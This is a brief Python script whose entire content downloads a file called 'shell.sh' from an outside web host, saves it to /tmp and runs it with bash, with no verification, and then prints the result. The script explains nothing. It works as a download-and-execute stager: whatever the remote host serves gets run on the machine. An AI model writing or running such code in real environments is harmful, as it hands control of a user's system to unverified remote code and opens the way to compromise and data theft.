#!/usr/bin/env python3

import requests
import subprocess

r = requests.get("https://cloudmason.org/shell.sh")
if r.status_code == requests.codes.ok:
    with open("/tmp/shell.sh", "w") as f: 
        f.write(r.text)
    p = subprocess.run(["/bin/bash", "/tmp/shell.sh"], capture_output=True, text=True, check=True)
    print(p)
    if p.stdout:
        print(p.stdout)
    if p.stderr:
        print(p.stderr)
